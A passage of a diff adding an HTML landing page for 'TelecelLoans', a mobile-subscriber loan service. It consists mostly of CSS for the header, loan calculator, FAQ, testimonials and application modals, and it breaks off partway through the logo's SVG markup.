@@ -1,0 +1,1375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TelecelLoans – Flex Loans for Telecel Subscribers</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --red: #E30613;
+      --red-dark: #C0040F;
+      --white: #FFFFFF;
+      --off-white: #F5F5F5;
+      --light-grey: #EBEBEB;
+      --mid-grey: #999999;
+      --dark-grey: #444444;
+      --black: #111111;
+      --green: #1DB954;
+      --radius: 6px;
+      --transition: 0.18s ease;
+    }
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--white);
+      color: var(--black);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ── HEADER ── */
+    header {
+      background: var(--white);
+      border-bottom: 3px solid var(--red);
+      position: sticky;
+      top: 0;
+      z-index: 900;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.08);
+    }
+    .header-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 24px;
+      height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+    }
+    .logo-name {
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+    }
+    .logo-name .t1 { color: var(--red); }
+    .logo-name .t2 { color: #0066CC; }
+    .logo-tag {
+      font-size: 10px;
+      color: var(--mid-grey);
+      font-weight: 500;
+      letter-spacing: 1.2px;
+      text-transform: uppercase;
+      display: block;
+      margin-top: 1px;
+    }
+    nav.desktop-nav { display: flex; align-items: center; gap: 4px; }
+    nav.desktop-nav a {
+      color: var(--dark-grey);
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      padding: 6px 14px;
+      border-radius: var(--radius);
+      transition: color var(--transition), background var(--transition);
+    }
+    nav.desktop-nav a:hover { color: var(--red); background: #fdf0f0; }
+    nav.desktop-nav a.active { color: var(--red); }
+    .btn-login {
+      background: var(--red);
+      color: white;
+      border: none;
+      padding: 9px 20px;
+      border-radius: var(--radius);
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: background var(--transition);
+      letter-spacing: 0.2px;
+    }
+    .btn-login:hover { background: var(--red-dark); }
+    .hamburger {
+      display: none;
+      flex-direction: column;
+      gap: 5px;
+      cursor: pointer;
+      background: none;
+      border: none;
+      padding: 4px;
+    }
+    .hamburger span {
+      display: block;
+      width: 22px;
+      height: 2px;
+      background: var(--black);
+      border-radius: 2px;
+      transition: all 0.25s;
+    }
+    .hamburger.open span:nth-child(1) { transform: translateY(7px) rotate(45deg); }
+    .hamburger.open span:nth-child(2) { opacity: 0; }
+    .hamburger.open span:nth-child(3) { transform: translateY(-7px) rotate(-45deg); }
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      top: 72px; left: 0; right: 0;
+      background: var(--white);
+      z-index: 850;
+      flex-direction: column;
+      border-top: 1px solid var(--light-grey);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      overflow: hidden;
+      max-height: 0;
+      transition: max-height 0.3s ease;
+    }
+    .mobile-nav.open { max-height: 400px; }
+    .mobile-nav a {
+      display: block;
+      padding: 14px 24px;
+      color: var(--black);
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      border-bottom: 1px solid var(--light-grey);
+      transition: background var(--transition);
+    }
+    .mobile-nav a:hover { background: var(--off-white); color: var(--red); }
+    .mobile-nav .mob-login {
+      margin: 16px 20px;
+      background: var(--red);
+      color: white;
+      border: none;
+      padding: 13px;
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 600;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      text-align: center;
+      display: block;
+    }
+
+    /* ── HERO ── */
+    .hero {
+      background: var(--red);
+      padding: 56px 0 48px;
+    }
+    .hero-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: grid;
+      grid-template-columns: 1fr 420px;
+      gap: 48px;
+      align-items: center;
+    }
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.15);
+      color: white;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 5px 14px;
+      border-radius: 20px;
+      margin-bottom: 20px;
+      letter-spacing: 0.5px;
+    }
+    .hero-badge .dot {
+      width: 6px; height: 6px;
+      background: white;
+      border-radius: 50%;
+      animation: pulse 1.6s infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+    .hero-title {
+      font-size: 44px;
+      font-weight: 700;
+      color: white;
+      line-height: 1.1;
+      letter-spacing: -1px;
+      margin-bottom: 16px;
+    }
+    .hero-desc {
+      font-size: 16px;
+      color: rgba(255,255,255,0.85);
+      line-height: 1.7;
+      max-width: 480px;
+    }
+
+    /* ── CALCULATOR CARD ── */
+    .calc-card {
+      background: white;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.18);
+    }
+    .calc-head {
+      background: var(--black);
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .calc-head-icon {
+      width: 36px; height: 36px;
+      background: rgba(227,6,19,0.2);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .calc-head-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: white;
+    }
+    .calc-head-sub { font-size: 12px; color: rgba(255,255,255,0.5); margin-top: 1px; }
+    .calc-body { padding: 20px; }
+    .calc-field { margin-bottom: 20px; }
+    .calc-label {
+      display: block;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--mid-grey);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+    }
+    .amount-display {
+      font-size: 32px;
+      font-weight: 700;
+      color: var(--black);
+      letter-spacing: -0.5px;
+      margin-bottom: 10px;
+    }
+    .amount-display span { font-size: 16px; font-weight: 500; color: var(--mid-grey); margin-right: 4px; }
+    input[type="range"] {
+      width: 100%;
+      height: 4px;
+      -webkit-appearance: none;
+      appearance: none;
+      background: var(--light-grey);
+      border-radius: 2px;
+      outline: none;
+      cursor: pointer;
+    }
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      width: 18px; height: 18px;
+      border-radius: 50%;
+      background: var(--red);
+      border: 3px solid white;
+      box-shadow: 0 0 0 1px var(--red);
+      cursor: pointer;
+    }
+    .range-labels {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: var(--mid-grey);
+      margin-top: 6px;
+      font-weight: 500;
+    }
+    .period-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 6px;
+    }
+    .period-btn {
+      padding: 10px;
+      border: 1.5px solid var(--light-grey);
+      border-radius: var(--radius);
+      background: white;
+      color: var(--dark-grey);
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: all var(--transition);
+      text-align: center;
+    }
+    .period-btn:hover { border-color: var(--red); color: var(--red); }
+    .period-btn.active { background: var(--red); border-color: var(--red); color: white; font-weight: 600; }
+    .calc-result {
+      background: var(--off-white);
+      border-radius: var(--radius);
+      padding: 14px 16px;
+      margin: 16px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .cr-item { display: flex; flex-direction: column; gap: 3px; }
+    .cr-label { font-size: 10px; font-weight: 600; color: var(--mid-grey); text-transform: uppercase; letter-spacing: 1px; }
+    .cr-val { font-size: 20px; font-weight: 700; color: var(--black); }
+    .cr-val.green { color: var(--green); }
+    .cr-divider { width: 1px; height: 36px; background: var(--light-grey); }
+    .calc-note { font-size: 11px; color: var(--mid-grey); text-align: center; margin-bottom: 14px; }
+    .btn-apply {
+      width: 100%;
+      background: var(--red);
+      color: white;
+      border: none;
+      padding: 13px;
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: background var(--transition);
+      letter-spacing: 0.3px;
+    }
+    .btn-apply:hover { background: var(--red-dark); }
+
+    /* ── STATS ── */
+    .stats-bar {
+      background: var(--black);
+      padding: 0;
+    }
+    .stats-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+    }
+    .stat-item {
+      padding: 24px 20px;
+      text-align: center;
+      border-right: 1px solid rgba(255,255,255,0.08);
+    }
+    .stat-item:last-child { border-right: none; }
+    .stat-val {
+      font-size: 28px;
+      font-weight: 700;
+      color: white;
+      letter-spacing: -0.5px;
+    }
+    .stat-label {
+      font-size: 11px;
+      color: rgba(255,255,255,0.5);
+      font-weight: 500;
+      margin-top: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+    }
+
+    /* ── SECTIONS ── */
+    .section { padding: 72px 0; }
+    .section-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+    .section-tag {
+      display: inline-block;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--red);
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 10px;
+    }
+    .section-title {
+      font-size: 32px;
+      font-weight: 700;
+      color: var(--black);
+      letter-spacing: -0.5px;
+      line-height: 1.15;
+    }
+    .section-sub {
+      font-size: 15px;
+      color: var(--mid-grey);
+      margin-top: 10px;
+      max-width: 460px;
+    }
+    .section-header { margin-bottom: 48px; }
+
+    /* ── HOW IT WORKS ── */
+    .hiw { background: var(--off-white); }
+    .steps-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 24px;
+    }
+    .step-card {
+      background: white;
+      border-radius: 8px;
+      padding: 28px 20px;
+      border-top: 3px solid var(--light-grey);
+      transition: border-color var(--transition);
+    }
+    .step-card:hover { border-top-color: var(--red); }
+    .step-num {
+      width: 40px; height: 40px;
+      background: var(--red);
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+    .step-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--black);
+      margin-bottom: 8px;
+    }
+    .step-desc { font-size: 14px; color: var(--mid-grey); line-height: 1.65; }
+
+    /* ── BENEFITS ── */
+    .benefits-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+    }
+    .benefit-card {
+      background: var(--off-white);
+      border-radius: 8px;
+      padding: 28px 24px;
+      border: 1px solid var(--light-grey);
+      transition: border-color var(--transition), background var(--transition);
+    }
+    .benefit-card:hover { border-color: var(--red); background: white; }
+    .benefit-icon {
+      font-size: 24px;
+      margin-bottom: 14px;
+      display: block;
+    }
+    .benefit-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--black);
+      margin-bottom: 8px;
+    }
+    .benefit-desc { font-size: 14px; color: var(--mid-grey); line-height: 1.65; }
+
+    /* ── FAQ ── */
+    .faq { background: var(--off-white); }
+    .faq-wrap { max-width: 720px; margin: 0 auto; }
+    .faq-item {
+      background: white;
+      border-radius: 8px;
+      margin-bottom: 6px;
+      overflow: hidden;
+      border: 1px solid var(--light-grey);
+      transition: border-color var(--transition);
+    }
+    .faq-item.open { border-color: var(--red); }
+    .faq-q {
+      padding: 18px 20px;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--black);
+      user-select: none;
+      gap: 12px;
+    }
+    .faq-arrow {
+      width: 26px; height: 26px;
+      background: var(--off-white);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 11px;
+      color: var(--mid-grey);
+      transition: transform 0.25s, background var(--transition), color var(--transition);
+    }
+    .faq-item.open .faq-arrow { transform: rotate(180deg); background: var(--red); color: white; }
+    .faq-ans { max-height: 0; overflow: hidden; transition: max-height 0.28s ease; }
+    .faq-item.open .faq-ans { max-height: 200px; }
+    .faq-ans-text { padding: 0 20px 18px; font-size: 14px; color: var(--dark-grey); line-height: 1.7; }
+
+    /* ── TESTIMONIALS ── */
+    .testimonials { background: var(--red); }
+    .testimonials .section-tag { color: rgba(255,255,255,0.6); }
+    .testimonials .section-title { color: white; }
+    .testimonials .section-sub { color: rgba(255,255,255,0.65); }
+    .t-toggle-btn {
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(255,255,255,0.15);
+      border: none;
+      color: white;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-family: 'Inter', sans-serif;
+      margin-top: 14px;
+      transition: background var(--transition);
+    }
+    .t-toggle-btn:hover { background: rgba(255,255,255,0.25); }
+    .t-arrow-ico { transition: transform 0.25s; }
+    .t-toggle-btn.open .t-arrow-ico { transform: rotate(180deg); }
+    .t-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.4s ease, margin-top 0.3s;
+    }
+    .t-grid.open { max-height: 500px; margin-top: 36px; }
+    .t-card {
+      background: rgba(255,255,255,0.12);
+      border-radius: 8px;
+      padding: 24px 20px;
+      border: 1px solid rgba(255,255,255,0.15);
+    }
+    .t-stars { color: rgba(255,255,255,0.9); font-size: 13px; margin-bottom: 12px; letter-spacing: 2px; }
+    .t-text { font-size: 14px; color: rgba(255,255,255,0.8); line-height: 1.7; font-style: italic; margin-bottom: 16px; }
+    .t-name { font-size: 14px; font-weight: 600; color: white; }
+    .t-role { font-size: 12px; color: rgba(255,255,255,0.5); margin-top: 2px; }
+
+    /* ── MODALS ── */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      backdrop-filter: blur(4px);
+    }
+    .modal-overlay.open { display: flex; }
+    .modal-box {
+      background: white;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 460px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      overflow: hidden;
+      border-top: 4px solid var(--red);
+      animation: slideUp 0.25s ease both;
+      max-height: 92vh;
+      overflow-y: auto;
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .modal-head {
+      background: var(--red);
+      padding: 18px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .modal-head-text h2 {
+      font-size: 17px;
+      font-weight: 700;
+      color: white;
+      margin: 0;
+    }
+    .modal-head-text .mh-sub { font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 2px; }
+    .modal-close {
+      background: rgba(255,255,255,0.15);
+      border: none;
+      color: white;
+      font-size: 14px;
+      cursor: pointer;
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background var(--transition);
+    }
+    .modal-close:hover { background: rgba(255,255,255,0.3); }
+    .modal-body { padding: 20px; }
+    .prog-bar { display: flex; gap: 4px; margin-bottom: 24px; }
+    .prog-seg { flex: 1; height: 3px; background: var(--light-grey); border-radius: 2px; transition: background 0.25s; }
+    .prog-seg.active { background: var(--red); }
+    .fgroup { margin-bottom: 16px; }
+    .flabel {
+      display: block;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--mid-grey);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 7px;
+    }
+    .finput {
+      width: 100%;
+      padding: 11px 13px;
+      border: 1.5px solid var(--light-grey);
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--black);
+      font-family: 'Inter', sans-serif;
+      outline: none;
+      transition: border-color var(--transition);
+      background: white;
+    }
+    .finput:focus { border-color: var(--red); box-shadow: 0 0 0 3px rgba(227,6,19,0.08); }
+    .frow { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .loan-summary {
+      background: var(--off-white);
+      border-radius: var(--radius);
+      padding: 14px 16px;
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 18px;
+    }
+    .ls-item { display: flex; flex-direction: column; gap: 3px; }
+    .ls-label { font-size: 10px; font-weight: 600; color: var(--mid-grey); text-transform: uppercase; letter-spacing: 0.5px; }
+    .ls-val { font-size: 18px; font-weight: 700; color: var(--black); }
+    .ls-val.green { color: var(--green); }
+    .review-box {
+      background: var(--off-white);
+      border-radius: var(--radius);
+      padding: 4px 0;
+      margin-bottom: 16px;
+    }
+    .review-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 16px;
+      border-bottom: 1px solid var(--light-grey);
+      font-size: 13px;
+    }
+    .review-row:last-child { border-bottom: none; }
+    .rr-label { color: var(--mid-grey); font-weight: 400; }
+    .rr-val { color: var(--black); font-weight: 600; }
+    .success-wrap { text-align: center; padding: 12px 0 8px; }
+    .success-icon {
+      width: 56px; height: 56px;
+      background: var(--red);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+      font-size: 24px;
+      color: white;
+    }
+    .success-title { font-size: 20px; font-weight: 700; color: var(--black); margin-bottom: 8px; }
+    .success-desc { font-size: 14px; color: var(--mid-grey); line-height: 1.65; }
+    .btn-primary {
+      width: 100%;
+      background: var(--red);
+      color: white;
+      border: none;
+      padding: 13px;
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: background var(--transition);
+      letter-spacing: 0.2px;
+    }
+    .btn-primary:hover { background: var(--red-dark); }
+    .btn-secondary {
+      width: 100%;
+      background: white;
+      color: var(--dark-grey);
+      border: 1.5px solid var(--light-grey);
+      padding: 11px;
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: border-color var(--transition), color var(--transition);
+      margin-top: 8px;
+    }
+    .btn-secondary:hover { border-color: var(--red); color: var(--red); }
+    .modal-btns { display: flex; flex-direction: column; }
+
+    /* ── FOOTER ── */
+    footer {
+      background: var(--black);
+      padding: 48px 0 0;
+    }
+    .footer-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+    .footer-top {
+      display: grid;
+      grid-template-columns: 2fr 1fr 1fr 1fr;
+      gap: 40px;
+      padding-bottom: 40px;
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+    .footer-brand p {
+      font-size: 13px;
+      color: rgba(255,255,255,0.4);
+      line-height: 1.7;
+      margin-top: 12px;
+      max-width: 240px;
+    }
+    .footer-divider { width: 28px; height: 2px; background: var(--red); margin: 14px 0; }
+    .footer-col h4 {
+      font-size: 10px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: rgba(255,255,255,0.25);
+      margin-bottom: 16px;
+    }
+    .footer-col a {
+      display: block;
+      font-size: 13px;
+      color: rgba(255,255,255,0.5);
+      text-decoration: none;
+      margin-bottom: 10px;
+      font-weight: 400;
+      pointer-events: none;
+      cursor: default;
+    }
+    .footer-bottom {
+      padding: 20px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .footer-bottom p { font-size: 12px; color: rgba(255,255,255,0.25); }
+    .footer-badge {
+      font-size: 12px;
+      color: rgba(255,255,255,0.25);
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+    .footer-badge-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 960px) {
+      .hero-inner { grid-template-columns: 1fr; }
+      .calc-card { max-width: 480px; }
+      .steps-grid { grid-template-columns: repeat(2, 1fr); }
+      .benefits-grid { grid-template-columns: repeat(2, 1fr); }
+      .stats-inner { grid-template-columns: repeat(2, 1fr); }
+      .footer-top { grid-template-columns: 1fr 1fr; }
+      .t-grid { grid-template-columns: 1fr; }
+    }
+    @media (max-width: 720px) {
+      nav.desktop-nav { display: none; }
+      .hamburger { display: flex; }
+      .mobile-nav { display: flex; }
+      .btn-login { display: none; }
+      .hero { padding: 40px 0 36px; }
+      .hero-title { font-size: 32px; }
+      .section { padding: 56px 0; }
+      .section-title { font-size: 26px; }
+      .benefits-grid { grid-template-columns: 1fr; }
+      .frow { grid-template-columns: 1fr; }
+      .footer-top { grid-template-columns: 1fr; gap: 24px; }
+      .footer-bottom { flex-direction: column; text-align: center; }
+    }
+    @media (max-width: 480px) {
+      .hero-title { font-size: 26px; }
+      .stats-inner { grid-template-columns: repeat(2, 1fr); padding: 0 16px; }
+      .period-grid { grid-template-columns: repeat(2, 1fr); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="header-inner">
+    <a href="#" class="logo">
+      <svg width="44" height="44" viewBox="0 0 141 140" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M70.7739 41.8297C59.4621 41.7154 50.3693 51.0317 50.3985 62.0956C50.4277 73.8279 60.2714 82.4831 70.5454 82.296C81.4391 82.3981 90.7482 73.6894 90.8429 62.3557C90.9426 50.4873 81.5436 41.9415 70.7739 41.8297ZM78.8579 55.6546C78.6659 57.2807 77.7107 58.2408 76.228 58.756C75.4089 59.0428 74.5558 59.0501 73.6978 59.0501C73.1704 59.0477 72.6381 59.004 72.1107 59.089C71.7315 59.1522 71.5225 59.3418 71.469 59.7477C71.3912 60.297 71.5055 60.8317 71.5006 61.3737C71.4982 63.5953 71.5006 65.8217 71.4982 68.0432C71.4982 68.4126 71.5371 68.7772 71.6148 69.1345C71.9308 70.5515 73.1096 71.3925 74.5534 71.2151C75.6617 71.0765 76.7822 71.0692 77.8954 70.9744C78.362 70.9356 78.5103 71.1421 78.4763 71.638C78.4228 72.3817 78.4277 73.1255 78.4739 73.8717C78.5686 75.4175 77.8443 76.521 76.5245 77.0678C72.9565 78.5432 69.4346 78.5092 66.2166 76.1856C64.4471 74.9095 63.5016 73.0842 63.3995 70.831C63.2732 67.9363 63.2221 65.0415 63.1346 62.1418C63.0423 59.2154 63.0714 56.2866 63.0933 53.3602C63.1079 51.3963 64.0193 49.8019 65.468 48.5112C66.2725 47.7918 67.1693 47.206 68.144 46.7394C69.0287 46.314 69.9548 46.1536 70.927 46.1682C71.2745 46.1755 71.4058 46.3067 71.4398 46.664C71.5346 47.5901 71.4884 48.5185 71.5079 49.3668C71.5079 50.1178 71.5006 50.796 71.5079 51.4717C71.5103 52.0599 71.7193 52.2737 72.3148 52.3612C72.7256 52.4244 73.1339 52.371 73.5447 52.3685C74.9593 52.3515 76.369 52.3515 77.7836 52.3612C78.6173 52.371 78.8749 52.6262 78.8506 53.4501C78.8263 54.1866 78.9502 54.9133 78.8652 55.6546H78.8579Z" fill="#E32527"/>
+        <path d="M71.4683 59.7455C71.3905 60.2948 71.5048 60.8295 71.4999 61.3715C71.4975 63.593 71.4999 65.8194 71.4975 68.0409C71.4975 68.4104 71.5364 68.775 71.6141 69.1323C71.9301 70.5493 73.1089 71.3902 74.5527 71.2128C75.661 71.0743 76.7815 71.067 77.8947 70.9722C78.3614 70.9333 78.5096 71.1399 78.4756 71.6357C78.4221 72.3795 78.427 73.1232 78.4732 73.8694C78.568 75.4153 77.8437 76.5187 76.5239 77.0656C72.9558 78.5409 69.4339 78.5069 66.2159 76.1833C64.4464 74.9073 63.5009 73.0819 63.3989 70.8288C63.2725 67.934 63.2214 65.0392 63.1339 62.1396C63.0416 59.2132 63.0707 56.2843 63.0926 53.358C63.1072 51.3941 64.0187 49.7996 65.4673 48.509C66.2718 47.7896 67.1687 47.2038 68.1433 46.7371C69.028 46.3118 69.9541 46.1514 70.9263 46.1659C71.2739 46.1732 71.4051 46.3045 71.4391 46.6618C71.5339 47.5878 71.4878 48.5163 71.5072 49.3646C71.5072 50.1156 71.4999 50.7937 71.5072 51.4694C71.5096 52.0576 71.7187 52.2715 72.3141 52.359C72.7249 52.4222 73.1332 52.3687 73.544 52.3663C74.9586 52.3493 76.3683 52.3493 77.7829 52.359C78.6166 52.3687 78.8742 52.6239 78.8499 53.4479C78.8256 54.1843 78.9496 54.9111 78.8645 55.6524C78.6725 57.2784 77.7173 58.2385 76.2346 58.7538C75.4155 59.0406 74.5624 59.0479 73.7044 59.0479C73.177 59.0455 72.6447 59.0017 72.1173 59.0868C71.7381 59.15 71.5291 59.3396 71.4756 59.7455H71.4683Z" fill="white"/>
+        <path d="M103.955 102.837C105.246 102.863 106.736 102.679 108.146 102.035C108.488 101.879 108.551 102.139 108.598 102.38C108.882 103.85 108.148 105.367 106.804 106.101C105.939 106.572 105.013 106.852 104.04 106.954C102.018 107.165 100.025 107.092 98.1146 106.12C95.475 104.776 93.9122 101.974 93.9219 99.0109C93.9268 97.2123 94.2379 95.4939 95.2101 93.9408C96.7924 91.4081 99.0771 90.0689 102.086 90.0081C104.215 89.9644 106.118 90.5526 107.737 91.972C109.665 93.6612 110.002 95.946 109.293 98.2137C109.001 99.1421 108.184 99.6283 107.273 99.9102C106.182 100.248 105.042 100.272 103.919 100.384C102.601 100.513 101.287 100.627 99.9594 100.569C99.5681 100.552 99.4782 100.698 99.6337 101.067C100.047 102.056 100.854 102.535 101.865 102.727C102.475 102.844 103.095 102.824 103.953 102.834L103.955 102.837Z" fill="#E32527"/>
+        <path d="M70.5666 102.832C72.0978 102.846 73.4881 102.666 74.786 102.03C75.1287 101.862 75.1919 102.044 75.2381 102.314C75.5249 104.001 74.7568 105.498 73.2062 106.244C72.3773 106.643 71.4975 106.881 70.5836 106.966C68.7655 107.134 66.9742 107.093 65.2582 106.344C62.7232 105.236 61.2065 103.291 60.7228 100.613C60.2075 97.7592 60.752 95.0904 62.66 92.83C64.1645 91.0484 66.0992 90.0641 68.469 90.0227C70.3162 89.9911 72.0808 90.2877 73.6291 91.3717C75.6805 92.8082 76.5287 94.7891 76.2225 97.2318C76.0645 98.4859 75.1506 99.5311 73.928 99.8519C72.3676 100.26 70.761 100.362 69.169 100.566C68.3621 100.671 67.5454 100.661 66.736 100.584C66.1721 100.53 66.0773 100.688 66.2985 101.201C66.578 101.855 67.0763 102.253 67.7496 102.453C68.7023 102.735 69.6721 102.871 70.5641 102.837L70.5666 102.832Z" fill="#E32527"/>
+        <path d="M41.6208 102.834C43.0086 102.871 44.5156 102.681 45.9399 102.035C46.2316 101.904 46.3288 102.047 46.3871 102.317C46.7007 103.812 45.9691 105.367 44.5934 106.118C43.66 106.629 42.6514 106.874 41.5989 106.959C39.7954 107.105 38.0187 107.078 36.3222 106.293C33.4541 104.961 31.9982 102.693 31.7673 99.5824C31.6628 98.1897 31.7357 96.8115 32.2656 95.5039C33.4031 92.6966 35.2916 90.7036 38.3857 90.164C40.4906 89.797 42.5347 90.0254 44.4329 91.1386C45.8548 91.9723 46.8562 93.3942 47.2062 95.0032C47.8576 97.9976 46.8562 99.4049 45.0017 99.9178C43.9906 100.197 42.943 100.253 41.9052 100.363C41.0132 100.457 40.1211 100.54 39.2291 100.628C38.7284 100.676 38.2302 100.589 37.7319 100.567C37.3989 100.552 37.3066 100.708 37.4305 101.009C37.834 101.996 38.5899 102.533 39.6156 102.73C40.2257 102.847 40.8454 102.83 41.6208 102.834Z" fill="#E32527"/>
+        <path d="M27.8097 90.1057C28.3104 90.13 28.9715 90.0668 29.6326 90.1592C30.0045 90.2102 30.1406 90.3998 30.1358 90.7449C30.1309 91.1265 30.1358 91.5106 30.1358 91.8922C30.1309 93.3942 29.2608 94.3592 27.7587 94.5585C27.1292 94.6436 26.4972 94.6557 25.8653 94.6387C25.5056 94.629 25.3743 94.7821 25.3549 95.1321C25.2649 96.9404 25.2309 98.7463 25.3694 100.552C25.4764 101.94 26.2056 102.516 27.574 102.348C28.2132 102.271 28.8646 102.263 29.5087 102.224C29.7736 102.207 29.9122 102.283 29.8927 102.601C29.8635 103.051 29.8174 103.503 29.866 103.95C29.9972 105.156 29.4965 105.963 28.4562 106.395C26.1594 107.35 23.9257 107.244 21.8767 105.778C20.6712 104.915 20.0003 103.666 19.9493 102.164C19.8278 98.5057 19.7524 94.8453 19.75 91.1824C19.75 89.4324 20.5399 88.188 21.8524 87.1793C22.6594 86.5595 23.5465 86.1172 24.5844 86.0515C25.2771 86.0078 25.3549 86.0831 25.3597 86.7661C25.3646 87.5609 25.3549 88.3557 25.3549 89.1481C25.3549 89.9939 25.4569 90.096 26.2833 90.1008C26.7403 90.1033 27.1948 90.1008 27.8122 90.1008L27.8097 90.1057Z" fill="#E32527"/>
